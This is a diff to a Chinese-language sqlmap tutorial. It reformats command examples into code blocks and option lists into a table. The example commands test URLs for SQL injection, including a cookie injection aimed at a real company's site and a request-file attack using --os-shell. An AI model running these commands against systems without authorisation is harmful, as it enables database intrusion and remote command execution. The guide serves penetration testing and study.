@@ -16,17 +16,23 @@ sqlmap支持五种不同的注入模式：
 
 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
 
+### Options（选项）：
+
+* –version 显示程序的版本号并退出
+* -h, –help 显示此帮助消息并退出
+* -v VERBOSE 详细级别：0-6（默认为1）
+
 ## 检测注入
 
 ### 基本格式
 
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″)
-
+```
+sqlmap -u "http://www.vuln.cn/post.php?id=1"
 默认使用level1检测全部数据库类型
 
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″) –dbms mysql –level 3
-
-指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3
+指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面)
+```
 
 ### 跟随302跳转
 
@@ -36,8 +42,10 @@ sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?i
 
 ### cookie注入
 
-当程序有防get注入的时候，可以使用cookie注入  
-sqlmap -u “[http://www.baidu.com/shownews.asp”](http://www.baidu.com/shownews.asp”) –cookie “id=11″ –level 2（只有level达到2才会检测cookie）
+```
+当程序有防get注入的时候，可以使用cookie注入
+sqlmap -u "http://www.baidu.com/shownews.asp" –cookie “id=11″ –level 2（只有level达到2才会检测cookie）
+```
 
 ### 从post数据包中注入
 
@@ -104,22 +112,17 @@ sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
 
 ——————————————————————————————————
 
-### Options（选项）：
-
-* –version 显示程序的版本号并退出
-* -h, –help 显示此帮助消息并退出
-* -v VERBOSE 详细级别：0-6（默认为1）
-
 ### Target（目标）：
 
 以下至少需要设置其中一个选项，设置目标URL。
 
-* -d DIRECT 直接连接到数据库。
-* -u URL, –url=URL 目标URL。
-* -l LIST 从Burp或WebScarab代理的日志中解析目标。
-* -r REQUESTFILE 从一个文件中载入HTTP请求。
-* -g GOOGLEDORK 处理Google dork的结果作为目标URL。
-* -c CONFIGFILE 从INI配置文件中加载选项。
+| -u | URL | –url=URL 目标URL |
+| :--- | :--- | :--- |
+| -d | DIRECT | 直接连接到数据库 |
+| -l | LIST | 从Burp或WebScarab代理日志解析目标 |
+| -r | REQUEST | 从一个文件中载入HTTP请求 |
+| -g | GOOGLEDORK | 处理Google dork的结果作为目标URL |
+| -c | CONFIGFILE | 从INI配置文件中加载选 |
 
 ### Request（请求）：
 
